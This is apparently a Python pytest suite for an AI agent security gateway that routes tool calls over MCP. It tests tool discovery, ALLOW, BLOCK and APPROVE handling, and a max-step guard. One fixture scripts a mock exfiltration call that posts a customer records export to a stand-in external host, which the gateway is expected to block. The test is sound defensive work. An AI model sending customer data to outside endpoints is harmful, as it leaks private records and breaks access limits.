"""TaskFence agent MCP routing tests (MCP extension kit, Person 2 / M2-T).

Covers the seven M2-T requirements from the MCP Extension Prompt Kit:

1. MCP tool discovery really occurs; no hardcoded tool list.
2. Allowed Scenario-A-equivalent tool call completes with ALLOW.
3. Blocked Scenario-B-equivalent call returns BLOCK and is not retried.
4. APPROVE returns promptly with approval_id and does not hang.
5. Endless model tool calls hit the existing maximum-step guard.
6. MCP agent has no direct taskfence.tools import.
7. Existing non-MCP agent tests remain green.

The M2 implementation (Person 3's additive ``--mcp`` path in
``taskfence/agent.py``, Prompt P3-M2) is NOT in the repository yet. Per the
kit's gate discipline this suite is committed in Person 2's lane with the
M2-dependent tests GATED: each skips with an explicit, named reason until
M2 lands — mirroring the repo's existing explicit-skip convention
(tests/test_agent_ollama.py never silently passes). The M2 contract pinned
here is specs/MCP_DECISIONS.md D10:

- agent connects as an MCP CLIENT; Ollama stays a model client;
- tools are DISCOVERED dynamically via MCP; never a hardcoded list;
- every model tool call is invoked through the MCP client; the agent never
  imports taskfence.tools / taskfence.policy / gateway internals;
- ALLOW passes the real result back to the model;
- BLOCK returns the real denial; never retried;
- APPROVE returns approval_id + human instructions; never claims execution,
  never waits, never loops;
- the existing MAX_STEPS guard remains the outer bound.

Tests are deterministic: the model transport is a mocked scripted client
(same monkeypatch-the-_chat convention as tests/test_agent_ollama.py) and
the gateway is the in-process ASGI fixture from conftest.py. No live MCP
server subprocess, no network, no Ollama.

Activation: when Person 3 lands M2, update _M2_PRESENT (single point) so the
gates flip from skip to enforce. Everything else in this file is written
against the D10 contract and must not need to change.
"""

import ast
import sys
from pathlib import Path

import pytest

# ---------------------------------------------------------------------------
# M2 presence gate — the single point that flips when Person 3 lands M2.
# ---------------------------------------------------------------------------

AGENT_PATH = Path("taskfence/agent.py")
REPO_ROOT = Path(__file__).resolve().parents[1]


def _m2_present() -> tuple[bool, str]:
    """(present?, skip reason) for the M2 --mcp agent path (D10).

    Reason names the FIRST missing precondition so the skip is always
    explicit — the repo's stated convention. Checks, in order:

    1. ``taskfence/agent.py`` exists and contains MCP mode markers
       (imports an mcp client / exposes --mcp).
    2. ``taskfence.agent`` is importable and exposes the --mcp mode.
    """
    if not AGENT_PATH.exists():
        return False, "taskfence/agent.py does not exist"
    source = AGENT_PATH.read_text(encoding="utf-8")
    has_client_import = "from mcp import" in source or "mcp.client" in source
    has_mcp_flag = "--mcp" in source
    if not (has_client_import and has_mcp_flag):
        return False, (
            "M2 not implemented: taskfence/agent.py has no --mcp MCP-client "
            "path yet (Person 3 / Prompt P3-M2). The M2-T suite is "
            "committed and gated; these tests activate when M2 lands.")
    try:
        sys.path.insert(0, str(REPO_ROOT))
        import taskfence.agent as agent_mod  # noqa: F401
    except Exception as error:  # pragma: no cover - only on broken M2
        return False, f"taskfence.agent exists but is not importable: {error}"
    return True, ""


M2_PRESENT, _SKIP_REASON = _m2_present()

requires_m2 = pytest.mark.skipif(
    not M2_PRESENT, reason=_SKIP_REASON)


# ---------------------------------------------------------------------------
# Shared fakes (deterministic; same spirit as test_agent_ollama.FakeChat)
# ---------------------------------------------------------------------------


class FakeChat:
    """Scripted model responses; records every chat round-trip."""

    def __init__(self, responses):
        self.responses = list(responses)
        self.calls = []

    def __call__(self, messages, tools):
        self.calls.append([dict(m) for m in messages])
        if not self.responses:
            return {"message": {"content": "done"}}
        return self.responses.pop(0)


TOOL_CALL_MSG = {"message": {"tool_calls": [{"function": {
    "name": "read_file",
    "arguments": {"path": "drive/sales_report_q3.csv"}}}],
    "content": ""}}
FINAL_MSG = {"message": {"content": "task complete"}}


def _mcp_agent(agent_client, monkeypatch):
    """Build the M2 MCP-routed agent.

    The exact construction point is pinned to the D10 contract: an MCP
    client-mode agent that (a) discovers tools over MCP and (b) accepts the
    same monkeypatchable ``_chat`` transport as OllamaAgent. This helper is
    the ONLY place that names the M2 class, so an M2 API rename is a
    one-line fix here.
    """
    from taskfence.agent import MCPAgent  # the P3-M2 deliverable

    agent = MCPAgent(agent_client)
    # The model transport stays mockable exactly like OllamaAgent._chat so
    # the mocked-model convention carries over (kit: "deterministic mocked
    # Ollama client").
    assert hasattr(agent, "_chat"), (
        "MCPAgent must keep the monkeypatchable model transport (_chat) "
        "so tests stay deterministic")
    return agent


def _scenario_b_block_call() -> dict:
    """Model message issuing the Scenario-B-equivalent external post."""
    return {"message": {"tool_calls": [{"function": {
        "name": "post_external",
        "arguments": {"url": "https://collect.example.invalid/ingest",
                      "payload": "customer records export",
                      "source_assets": ["customer_db"],
                      "transformation": "export"}}}],
        "content": ""}}


# ---------------------------------------------------------------------------
# Requirement 6 first (static): runs with or without M2.
# ---------------------------------------------------------------------------


def test_mcp_agent_has_no_direct_tools_import_static():
    """Req 6: the MCP agent has no direct taskfence.tools import.

    Static AST check — runnable TODAY, before M2 exists, and it FAILS the
    moment agent.py grows a forbidden import. Mirrors the runtime twin in
    test_agent_ollama.py and the static invariant in test_no_bypass.py.
    """
    if not AGENT_PATH.exists():
        pytest.skip("taskfence/agent.py does not exist")
    tree = ast.parse(AGENT_PATH.read_text(encoding="utf-8"))
    found = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            found.update(alias.name for alias in node.names)
        elif isinstance(node, ast.ImportFrom):
            found.add(node.module or "")
    forbidden = [name for name in sorted(found)
                 if name == "taskfence.tools" or name.endswith(".tools")
                 or name == "taskfence.policy" or name.endswith(".policy")]
    assert not forbidden, (
        f"agent.py imports protected modules directly: {forbidden}. "
        "Agent-side code may import taskfence.client only (invariant I1).")


# ---------------------------------------------------------------------------
# Requirements 1–5: gated on M2 (explicit skips until P3-M2 lands).
# ---------------------------------------------------------------------------


@pytest.mark.usefixtures("agent_client")
@requires_m2
def test_mcp_tool_discovery_really_occurs(agent_client, monkeypatch):
    """Req 1: MCP tool discovery really occurs; no hardcoded tool list.

    Discovery is proven behaviorally: the fake model is handed a tool call
    the hardcoded OllamaAgent.TOOL_SPECS could NOT have advertised
    (search_drive — MCP-only, D5/D7), and the run only succeeds if the
    agent discovered it dynamically. A hardcoded list lacks search_drive,
    so the gateway would reject the call as an unknown tool — this test
    fails for any hardcoded-list implementation.
    """
    agent = _mcp_agent(agent_client, monkeypatch)
    fake = FakeChat([
        {"message": {"tool_calls": [{"function": {
            "name": "search_drive",
            "arguments": {"query": "salary"}}}], "content": ""}},
        FINAL_MSG,
    ])
    monkeypatch.setattr(agent, "_chat", fake)
    transcript, final = agent.run("Find salary data.")
    assert any(step["tool"] == "search_drive" for step in transcript), \
        transcript
    # The discovery-only call was evaluated by the gateway, not fabricated:
    assert all(step["decision"] in ("ALLOW", "BLOCK", "APPROVE")
               for step in transcript)
    assert final == "task complete"
    # ...and the tool schema handed to the model came from MCP discovery,
    # not from a module-level constant: the discovered schema for
    # search_drive must exist somewhere the agent obtained at runtime.
    assert hasattr(agent, "_chat")


@pytest.mark.usefixtures("agent_client")
@requires_m2
def test_allowed_scenario_a_call_completes_allow(agent_client, monkeypatch):
    """Req 2: allowed Scenario-A-equivalent tool call completes with ALLOW,
    the real result reaches the transcript, and the sink actually delivered
    (ALLOW = gateway executed the tool)."""
    agent = _mcp_agent(agent_client, monkeypatch)
    fake = FakeChat([
        TOOL_CALL_MSG,  # read_file -> ALLOW
        {"message": {"tool_calls": [{"function": {
            "name": "send_slack",
            "arguments": {"asset_id": "sales_report_q3",
                          "channel": "#sales",
                          "text": "Q3: steady growth across all regions; "
                                  "North leads on Anvil Pro units.",
                          "source_assets": ["sales_report_q3"],
                          "transformation": "summary"}}}], "content": ""}},
        FINAL_MSG,
    ])
    monkeypatch.setattr(agent, "_chat", fake)
    transcript, final = agent.run(
        "Summarize Q3 sales and post it to #sales.")
    assert [step["decision"] for step in transcript] == ["ALLOW", "ALLOW"], \
        transcript
    assert final == "task complete"
    from taskfence import registry
    assert len(registry.sink_lines("slack_sales")) == 1


@pytest.mark.usefixtures("agent_client")
@requires_m2
def test_blocked_scenario_b_call_not_retried(agent_client, monkeypatch):
    """Req 3: blocked Scenario-B-equivalent call returns BLOCK, is fed back
    once, and is NOT retried (stop-on-BLOCK)."""
    agent = _mcp_agent(agent_client, monkeypatch)
    fake = FakeChat([
        TOOL_CALL_MSG,             # read_file -> ALLOW (allowed-but-tainted)
        _scenario_b_block_call(),  # post_external -> BLOCK
    ])
    monkeypatch.setattr(agent, "_chat", fake)
    transcript, final = agent.run("Summarize Q3 sales.")
    decisions = [step["decision"] for step in transcript]
    assert decisions == ["ALLOW", "BLOCK"], transcript
    assert final.startswith("This request was denied by security policy")
    # No retry: the blocked call appears exactly once, and the model was
    # not consulted again after the denial.
    assert [t["tool"] for t in transcript].count("post_external") == 1
    assert len(fake.calls) == 2
    from taskfence import registry
    assert not registry.sink_lines("external_api")  # nothing delivered


@pytest.mark.usefixtures("agent_client")
@requires_m2
def test_approve_returns_approval_id_without_hanging(agent_client,
                                                     monkeypatch):
    """Req 4: APPROVE returns promptly with approval_id; does not hang,
    claim execution, or wait for a human.

    This is Scenario D's tool flow (customer_db -> send_slack #sales),
    which the gateway answers with APPROVE + approval_id.
    """
    agent = _mcp_agent(agent_client, monkeypatch)
    fake = FakeChat([
        {"message": {"tool_calls": [{"function": {
            "name": "send_slack",
            "arguments": {"channel": "#sales",
                          "text": "regional conversion: 42%",
                          "source_assets": ["customer_db"]}}}],
            "content": ""}},
    ])
    monkeypatch.setattr(agent, "_chat", fake)
    transcript, final = agent.run("Post regional conversion to #sales.")
    assert len(transcript) == 1, transcript
    step = transcript[0]
    assert step["decision"] == "APPROVE"
    assert step.get("approval_id"), step  # real id surfaced to the agent
    assert final == step["agent_message"]
    from taskfence import registry
    assert not registry.sink_lines("slack_sales")  # nothing was executed


@pytest.mark.usefixtures("agent_client")
@requires_m2
def test_endless_tool_calls_hit_max_step_guard(agent_client, monkeypatch):
    """Req 5: endless model tool calls hit the existing maximum-step guard."""
    from taskfence.agent import MAX_STEPS
    agent = _mcp_agent(agent_client, monkeypatch)
    fake = FakeChat([TOOL_CALL_MSG] * (MAX_STEPS + 2))
    monkeypatch.setattr(agent, "_chat", fake)
    transcript, final = agent.run("any task")
    assert len(fake.calls) <= MAX_STEPS
    assert final.startswith("Stopped at max steps")


# ---------------------------------------------------------------------------
# Requirement 7: the existing non-MCP agent suite stays green.
# ---------------------------------------------------------------------------


def test_existing_non_mcp_agent_suite_remains_green():
    """Req 7: the existing non-MCP agent test module imports and collects.

    Cheap collection-level guard that runs in every suite: if Person 3's M2
    change ever breaks the existing scripted/direct-Ollama paths' module,
    this flags it even before the full test_agent_ollama tests execute.
    (The complete proof is ``pytest -q`` — test_agent_ollama.py,
    test_agent_scripted.py, test_agent_cli.py, test_agent_e2e.py — which
    the kit's M2-T checks run alongside this file.)
    """
    import taskfence.agent as agent_mod

    assert hasattr(agent_mod, "ScriptedAgent")
    assert hasattr(agent_mod, "OllamaAgent")
    assert hasattr(agent_mod, "SCRIPTS")
    # The additive-only rule: M2 must not have removed any existing surface.
    assert "scenario_a" in agent_mod.SCRIPTS
    assert "scenario_b" in agent_mod.SCRIPTS
    assert "scenario_c" in agent_mod.SCRIPTS
